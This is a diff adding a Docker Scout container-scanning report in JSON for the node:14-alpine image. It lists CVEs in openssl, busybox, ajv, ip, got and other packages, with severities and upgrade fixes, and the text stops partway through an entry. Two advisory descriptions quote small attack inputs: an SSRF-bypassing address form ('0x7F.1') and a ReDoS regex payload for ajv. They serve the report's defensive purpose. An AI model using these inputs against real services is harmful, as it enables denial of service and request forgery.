@@ -1,0 +1,2210 @@
+{
+  "version": "15.0.6",
+  "vulnerabilities": [
+    {
+      "id": "25400b7850ecb8ede20c417ff57d17d62565e4f4814ad4921aefd97e326d2072",
+      "category": "container_scanning",
+      "message": "CVE-2023-42282 on ip@1.1.5",
+      "description": "The `isPublic()` function in the NPM package `ip` doesn't correctly identify certain private IP addresses in uncommon formats such as `0x7F.1` as private. Instead, it reports them as public by returning `true`. This can lead to security issues such as Server-Side Request Forgery (SSRF) if `isPublic()` is used to protect sensitive code paths when passed user input. Versions 1.1.9 and 2.0.1 fix the issue.",
+      "cve": "CVE-2023-42282",
+      "severity": "Low",
+      "confidence": "Unknown",
+      "solution": "Upgrade ip@1.1.5 to 1.1.9",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/ip@1.1.5"
+          },
+          "version": "1.1.5"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-42282",
+          "value": "CVE-2023-42282",
+          "url": "https://scout.docker.com/v/CVE-2023-42282?s=github&n=ip&t=npm&vr=%3C1.1.9"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-42282?s=github&n=ip&t=npm&vr=%3C1.1.9"
+        }
+      ]
+    },
+    {
+      "id": "76be4f32f5f64c28cc7bbd791e6a042dc6a77279b8d9a339660d056dd6961477",
+      "category": "container_scanning",
+      "message": "CVE-2025-5889 on brace-expansion@1.1.11",
+      "description": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "cve": "CVE-2025-5889",
+      "severity": "Low",
+      "confidence": "Unknown",
+      "solution": "Upgrade brace-expansion@1.1.11 to 1.1.12",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/brace-expansion@1.1.11"
+          },
+          "version": "1.1.11"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-5889",
+          "value": "CVE-2025-5889",
+          "url": "https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D1.0.0%2C%3C%3D1.1.11"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D1.0.0%2C%3C%3D1.1.11"
+        }
+      ]
+    },
+    {
+      "id": "321999171cb42388565492e411331fd406f9a9dc8a46f9955dca004f713e33d2",
+      "category": "container_scanning",
+      "message": "CVE-2023-6992 on alpine/zlib@1.2.13-r0",
+      "cve": "CVE-2023-6992",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/zlib@1.2.13-r0?os_name=alpine&os_version=3.17"
+          },
+          "version": "1.2.13-r0"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-6992",
+          "value": "CVE-2023-6992",
+          "url": "https://scout.docker.com/v/CVE-2023-6992?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D1.2.13-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-6992?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D1.2.13-r0"
+        }
+      ]
+    },
+    {
+      "id": "5956b507684a89b81c4062ecc67ddc7c4410d546b4bcc429ebd5f6914bbab3eb",
+      "category": "container_scanning",
+      "message": "CVE-2025-69418 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-69418",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-69418",
+          "value": "CVE-2025-69418",
+          "url": "https://scout.docker.com/v/CVE-2025-69418?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-69418?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "4c3c3957590af449ed775567a8ea16b0f81b24a0c0666312b5cdb54c5e348d7c",
+      "category": "container_scanning",
+      "message": "CVE-2024-13176 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-13176",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-13176",
+          "value": "CVE-2024-13176",
+          "url": "https://scout.docker.com/v/CVE-2024-13176?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-13176?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "247273834347c9512ef015c901f72102c65046807196a416b637f5bd8733ff4a",
+      "category": "container_scanning",
+      "message": "CVE-2024-9143 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-9143",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.15-r1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-9143",
+          "value": "CVE-2024-9143",
+          "url": "https://scout.docker.com/v/CVE-2024-9143?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-9143?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.15-r1"
+        }
+      ]
+    },
+    {
+      "id": "22ee2e4076a504334a5e8353aa5e9af99c45c1d835de716ecbfbde4898931bd7",
+      "category": "container_scanning",
+      "message": "CVE-2025-68160 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2025-68160",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-68160",
+          "value": "CVE-2025-68160",
+          "url": "https://scout.docker.com/v/CVE-2025-68160?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-68160?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "5e576bf97506e7e86b23bb43102a2260581ce88d952bfb55735f2498b1903efc",
+      "category": "container_scanning",
+      "message": "CVE-2023-4039 on alpine/gcc@12.2.1_git20220924-r4",
+      "cve": "CVE-2023-4039",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/gcc@12.2.1_git20220924-r4?os_name=alpine&os_version=3.17"
+          },
+          "version": "12.2.1_git20220924-r4"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-4039",
+          "value": "CVE-2023-4039",
+          "url": "https://scout.docker.com/v/CVE-2023-4039?s=alpine&n=gcc&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D12.2.1_git20220924-r4"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-4039?s=alpine&n=gcc&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D12.2.1_git20220924-r4"
+        }
+      ]
+    },
+    {
+      "id": "2bc7c8b9ff3d601159f1c5360bc8fdc100fd9319caf622a66c79df40efb01ad4",
+      "category": "container_scanning",
+      "message": "CVE-2022-33987 on got@6.7.1",
+      "description": "The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.",
+      "cve": "CVE-2022-33987",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade got@6.7.1 to 11.8.5",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/got@6.7.1"
+          },
+          "version": "6.7.1"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2022-33987",
+          "value": "CVE-2022-33987",
+          "url": "https://scout.docker.com/v/CVE-2022-33987?s=github&n=got&t=npm&vr=%3C11.8.5"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2022-33987?s=github&n=got&t=npm&vr=%3C11.8.5"
+        }
+      ]
+    },
+    {
+      "id": "ace6ee5481465ac3b50ce3bd35b300089e94957be2aee9fa51fb673e2b3651ce",
+      "category": "container_scanning",
+      "message": "CVE-2023-2975 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-2975",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.9-r2",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-2975",
+          "value": "CVE-2023-2975",
+          "url": "https://scout.docker.com/v/CVE-2023-2975?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r2"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-2975?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r2"
+        }
+      ]
+    },
+    {
+      "id": "65ad6a890c8b6428c16c0fc45267353c951b5ea2cd05d6d234f24c21653f2731",
+      "category": "container_scanning",
+      "message": "CVE-2023-3446 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-3446",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.9-r3",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-3446",
+          "value": "CVE-2023-3446",
+          "url": "https://scout.docker.com/v/CVE-2023-3446?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r3"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-3446?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.9-r3"
+        }
+      ]
+    },
+    {
+      "id": "c36127252214441b1b8257a7387d4e71fa63dc506a57d3e06c8224eb53447309",
+      "category": "container_scanning",
+      "message": "CVE-2023-3817 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-3817",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.10-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-3817",
+          "value": "CVE-2023-3817",
+          "url": "https://scout.docker.com/v/CVE-2023-3817?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.10-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-3817?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.10-r0"
+        }
+      ]
+    },
+    {
+      "id": "f68a79333533dd7263d88f8559cb6cd5c79757b3885c74d18c5d9e54d1637ade",
+      "category": "container_scanning",
+      "message": "CVE-2023-5678 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-5678",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.12-r1",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-5678",
+          "value": "CVE-2023-5678",
+          "url": "https://scout.docker.com/v/CVE-2023-5678?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r1"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-5678?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r1"
+        }
+      ]
+    },
+    {
+      "id": "1e446890a6b8544a1dd677b0c7712d08f23a80c8d5fbc7021ede44203f605d59",
+      "category": "container_scanning",
+      "message": "CVE-2024-4603 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-4603",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.13-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-4603",
+          "value": "CVE-2024-4603",
+          "url": "https://scout.docker.com/v/CVE-2024-4603?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.13-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-4603?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.13-r0"
+        }
+      ]
+    },
+    {
+      "id": "ee4d124184664d0c865b6034f7489d9c840afc7c0f0abd7f76313dd4ea527869",
+      "category": "container_scanning",
+      "message": "CVE-2026-22796 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2026-22796",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-22796",
+          "value": "CVE-2026-22796",
+          "url": "https://scout.docker.com/v/CVE-2026-22796?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-22796?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "28425e51ffaaf2af18c72a5feb14edaf5bb5e9e8f705ab1cb758d7c2b18b3e37",
+      "category": "container_scanning",
+      "message": "CVE-2023-42363 on alpine/busybox@1.35.0-r29",
+      "cve": "CVE-2023-42363",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r31",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
+          },
+          "version": "1.35.0-r29"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-42363",
+          "value": "CVE-2023-42363",
+          "url": "https://scout.docker.com/v/CVE-2023-42363?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-42363?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
+        }
+      ]
+    },
+    {
+      "id": "1519be172c6260779cf6fa40c0f6b7da0670e1b71d1be5bbd3d59fa604567612",
+      "category": "container_scanning",
+      "message": "CVE-2023-42364 on alpine/busybox@1.35.0-r29",
+      "cve": "CVE-2023-42364",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r31",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
+          },
+          "version": "1.35.0-r29"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-42364",
+          "value": "CVE-2023-42364",
+          "url": "https://scout.docker.com/v/CVE-2023-42364?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-42364?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
+        }
+      ]
+    },
+    {
+      "id": "05039810afee765fc040d738268c54f969a61a5063fb20f0e7ed4dc1fa7ac5cd",
+      "category": "container_scanning",
+      "message": "CVE-2023-42365 on alpine/busybox@1.35.0-r29",
+      "cve": "CVE-2023-42365",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r31",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
+          },
+          "version": "1.35.0-r29"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-42365",
+          "value": "CVE-2023-42365",
+          "url": "https://scout.docker.com/v/CVE-2023-42365?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-42365?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
+        }
+      ]
+    },
+    {
+      "id": "d2b539c87eca5a09e14dac92b1947e981e8b3408cdc48dc14d2fa3e9363667fe",
+      "category": "container_scanning",
+      "message": "CVE-2023-42366 on alpine/busybox@1.35.0-r29",
+      "cve": "CVE-2023-42366",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r30",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
+          },
+          "version": "1.35.0-r29"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-42366",
+          "value": "CVE-2023-42366",
+          "url": "https://scout.docker.com/v/CVE-2023-42366?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r30"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-42366?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r30"
+        }
+      ]
+    },
+    {
+      "id": "1f3b690e67e1599d15f718c1f576dbe00ecd116bfe0ec24ea67c825fbe0f2caf",
+      "category": "container_scanning",
+      "message": "CVE-2024-0727 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2024-0727",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.12-r4",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2024-0727",
+          "value": "CVE-2024-0727",
+          "url": "https://scout.docker.com/v/CVE-2024-0727?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r4"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2024-0727?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r4"
+        }
+      ]
+    },
+    {
+      "id": "5421ab5dea304f558cce56994a4ecf283eee0c36c5502d21f2af554f53d1251f",
+      "category": "container_scanning",
+      "message": "CVE-2025-69873 on ajv@6.12.6",
+      "description": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "cve": "CVE-2025-69873",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade ajv@6.12.6 to 8.18.0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:npm/ajv@6.12.6"
+          },
+          "version": "6.12.6"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2025-69873",
+          "value": "CVE-2025-69873",
+          "url": "https://scout.docker.com/v/CVE-2025-69873?s=github&n=ajv&t=npm&vr=%3C6.14.0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2025-69873?s=github&n=ajv&t=npm&vr=%3C6.14.0"
+        }
+      ]
+    },
+    {
+      "id": "f63373657875b3a6940c2cac78ca66ae6be243d8c9c10abf853ffd4a76429468",
+      "category": "container_scanning",
+      "message": "CVE-2026-22795 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2026-22795",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.19-r0",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2026-22795",
+          "value": "CVE-2026-22795",
+          "url": "https://scout.docker.com/v/CVE-2026-22795?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2026-22795?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.19-r0"
+        }
+      ]
+    },
+    {
+      "id": "306cbd0bcfd5e327405eee05466b7f7296c1abe460764821ab5a8e26697637bc",
+      "category": "container_scanning",
+      "message": "CVE-2023-1255 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-1255",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.8-r4",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-1255",
+          "value": "CVE-2023-1255",
+          "url": "https://scout.docker.com/v/CVE-2023-1255?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.8-r4"
+        }
+      ],
+      "links": [
+        {
+          "url": "https://scout.docker.com/v/CVE-2023-1255?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.8-r4"
+        }
+      ]
+    },
+    {
+      "id": "854e10ce81cd963d78b3d7a4ef0e84d5eaa0c675c8f294cb4a4ad65a18ab4e39",
+      "category": "container_scanning",
+      "message": "CVE-2023-6237 on alpine/openssl@3.0.8-r3",
+      "cve": "CVE-2023-6237",
+      "severity": "Medium",
+      "confidence": "Unknown",
+      "solution": "Upgrade alpine/openssl@3.0.8-r3 to 3.0.12-r3",
+      "scanner": {
+        "id": "docker-scout",
+        "name": "Docker Scout"
+      },
+      "location": {
+        "dependency": {
+          "package": {
+            "name": "pkg:apk/alpine/openssl@3.0.8-r3?os_name=alpine&os_version=3.17"
+          },
+          "version": "3.0.8-r3"
+        },
+        "operating_system": "alpine 3.17",
+        "image": "node:14-alpine"
+      },
+      "identifiers": [
+        {
+          "type": "cve",
+          "name": "CVE-2023-6237",
+          "value": "CVE-2023-6237",
+          "url": "https://scout.docker.com/v/CVE-2023-6237?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r3"
+        }
+      ],
+      "links": [
+        {
